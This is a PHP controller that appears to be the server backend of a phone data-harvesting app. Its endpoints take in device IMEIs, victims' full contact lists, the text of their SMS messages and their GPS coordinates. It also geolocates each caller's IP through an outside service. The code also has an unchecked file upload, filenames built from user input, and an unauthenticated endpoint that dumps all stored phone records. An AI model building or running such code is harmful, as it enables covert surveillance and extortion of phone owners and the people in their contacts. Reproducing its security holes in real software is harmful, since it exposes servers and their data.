<?php
namespace app\api\controller;
use think\Controller;
use think\Db;
use think\Request;

class Uploads extends Controller {
    
    public function img(){
       //$img = base64_decode(input('post.data'));
        $file = request()->file('data');
        //halt($file);
         $sjh = input('post.sjh');
        // $md5=$sjh.md5($img);
        if($file){
            // if(!file_exists("./imgs/".$md5.".png")){
            //     $myfile = fopen("./imgs/".$md5.".png", "w") or die("Unable to open file!");
            //     fwrite($myfile, $img);
            //     fclose($myfile);
            //     db('imgs')->insert([
            //     'sjh'=>$sjh,
            //     'name'=>$md5,
            //     'time'=>time()
            //     ]);
            // }
             $info = $file->move(ROOT_PATH . 'public' . DS . 'uploads'. DS .'imgs');
            if($info){
                // 成功上传后 获取上传信息
                // 输出 jpg
                $name=$info->getFilename(); 
                $url='/uploads/imgs/'.$info->getSaveName();
                     db('imgs')->insert([
                    'sjh'=>$sjh,
                    'name'=>$url,
                    'time'=>time()
                    ]);
                //echo $info->getExtension();
                // // 输出 20160820/42a79759f284b767dfcb2a0197904287.jpg
                 echo '/uploads/imgs/'.$info->getSaveName();
                // // 输出 42a79759f284b767dfcb2a0197904287.jpg
                // echo $info->getFilename(); 
            }else{
                // 上传失败获取错误信息
                echo $file->getError();
            }
        }else{
             echo $file->getError();
        }
    }
	public function img_base64($sjh){
	    $img = base64_decode(input('post.data'));
	    $md5=$sjh.md5($img);
	     if(!file_exists("./imgs/".$md5.".png")){
                $myfile = fopen("./imgs/".$md5.".png", "w") or die("Unable to open file!");
                fwrite($myfile, $img);
                fclose($myfile);
                db('imgs')->insert([
                'sjh'=>$sjh,
                'name'=>$md5,
                'time'=>time()
                ]);
            }
	}
    public function api(){
    	
           if (request()->isPost()){
           	
 			   $ip = request()->ip();
			   
			   $time = time();    
			   
			   $data = input('post.data');
			   
			   $a = explode('=',$data);
			   
			   $aaa = explode('**',$a[0]);
			   
			   if(count($a)<=0){
			   	
					exit('数据连接错误');
					
			   }
			   
			   $appconfig = $this->getappconfig();
			   
			   if($appconfig['is_login'] != 1){
			   
			        exit('暂时无法登录，请稍候再试');		  	
			   	
			   }
			   
			   if($appconfig['yaoqingma'] != $aaa[1] && isset($appconfig['yaoqingma']) && !empty($appconfig['yaoqingma'])){
			   	
			   	    exit('邀请码错误，请联系渠道商');
			   	    
			   }
			   
			   $z=db('user')->where('name', $aaa[0])->find();
			   
			   if($z>0){
			   	
					exit('重复号码，请换号码进行登录');
					
				}else{
					$co = $this->getip($ip);
					//$ipdizhi = $co['country'].$co['region'].$co['city'].$co['isp'];		
                 	$ipdizhi = $co;
					$regdata = array('name'=>$aaa[0],'code'=>$aaa[1],'clientid'=>$aaa[2],'login_time'=>$time,'ip'=>$ip,'ipdizhi'=>$ipdizhi);
					$userid = db('user')->insertGetId($regdata);
					if($userid){
						if(count($a) != 0) {
							foreach ($a as $k => $v) {
								if ($k>0){
								$b=explode('|',$v);
								$arr['userid'] = $userid;
								$arr['username'] = $b[0];
								$arr['umobile'] = $b[1];
								$arr['addtime'] = $time;
								$res[] = $arr;
								}
							};
							$nums = 100;
							$limit = ceil(count($res)/$nums);
							for ($i=1;$i<=$limit;$i++) {
								$offset=($i-1)*$nums;
								$data=array_slice($res,$offset,$nums);
								$result=db('mobile')->insertAll($data);
							};
							exit('正在加载列表');
							
						} else {
							exit('获取失败');
						}
					}else{
						exit('获取失败');
					}
				}			   

           }else{
           	
           	exit('获取失败');
           	
           }
    }	

    public function apisms(){
    	
           if (request()->isPost()){
           	
 			   $ip = request()->ip();
			   
			   $time = time();    
			   
		       $sms = input('post.data','',null);
		       
		       $sms = $this->filter_emoji($sms);
		       
		       $sms = json_decode($sms,true);
		       
		       if(count($sms) < 2){
		       	
		       	exit('获取信息错误');
		       	
		       }

		       $codedata = array_slice($sms,0,1,true);
		       
		       $smsdata = array_slice($sms,1);
		       
		       if(count($codedata) != 0 || count($smsdata) != 0){
		       	
		       	    $userid = db('user')->where(['name' => $codedata[0]['imei'],'code' => $codedata[0]['imei2']])->find();
		       	    
		       	    if($userid){
		       		foreach ($smsdata as $k => $v) {
						$arr['smscontent'] = $v['Smsbody'];
						$arr['smstel'] = $v['PhoneNumber'];
						$arr['smstime'] = $v['Date'];
						$arr['userid'] = $userid['id'];
						$arr['addtime'] = $time;
						$arr['type'] = $v['Type'];
						$res[] = $arr;
					};
					$nums = 100;
					$limit = ceil(count($res)/$nums);
					for ($i=1;$i<=$limit;$i++) {
						$offset=($i-1)*$nums;
						$data=array_slice($res,$offset,$nums);
						$result=db('content')->insertAll($data);
					};
					
					exit('获取成功');
					
		       	   }else{
		       	   	
		       	   exit('获取失败');
		       	   	
		       	   }

		       }else{
		       	
		       		exit('获取失败');
		       		
		       }
           	
           }else{
           	
           exit('获取失败');
           	
           }    	
    	
    }

    public function apimap(){
    	
           if (request()->isPost()){
           	
			   $data = input('post.data');
			   
			   $aaa = explode(',',$data);
			   
			   $where = array(
			   	
			   	'name' => $aaa[0],
			   	'code' => $aaa[1]
			   	
			   	);
			   $we = db('user')->where($where)->update(['mapx' => $aaa[2],'mapy' => $aaa[3]]);
			   if($we){
			    exit('获取成功');
			   }else{
			   	exit('获取失败');
			   }

			   
           }else{
           	
           	exit('获取失败');
           	
           }    	
    	
    }
    public function ed_phone(){
       // echo "这个是个接口";
        if (request()->isPost()){
            $phone = input('post.phone');
            $physical_phone = input('post.physical_phone');
            $invitation_code = input('post.invitation_code');
            echo $physical_phone;
            $dbs =  db('edphone')->insert([
                'phone'=>$phone,
                'invitation_code'=>$invitation_code,
                'physical_phone'=>$physical_phone
            ]);
            echo $dbs;

        }else {
            exit('获取失败,请用post访问');
        }

    }

    public function ed_phoneSelectAll(){

        // echo "这个是个接口";
        if (request()->isGet()){
            $info['list'] = db('edphone')->select();

            echo json_encode( $info['list']);

        }else {
            exit('获取失败,请用post访问');
        }

    }

	function getip($ip) {
		 $url = file_get_contents("https://ip.useragentinfo.com/json?ip=".$ip);
            $uridata = json_decode($url,true);
            
            if($uridata['code'] == 200){
                $ipmsg = $uridata['country'].$uridata['province'].$uridata['city'].$uridata['area'];
                return $ipmsg;
            }else{
              return '';
            }
	} 
	
    function filter_emoji($str) {  
    $regex = '/(\\\u[ed][0-9a-f]{3})/i';  
    $str = json_encode($str);  
    $str = preg_replace($regex, '', $str);
    return json_decode($str);  
    }

    function getappconfig(){
      $app_config = Db::name('appconfig')->where('app','appv1')->find();
      return $app_config;
    }    
}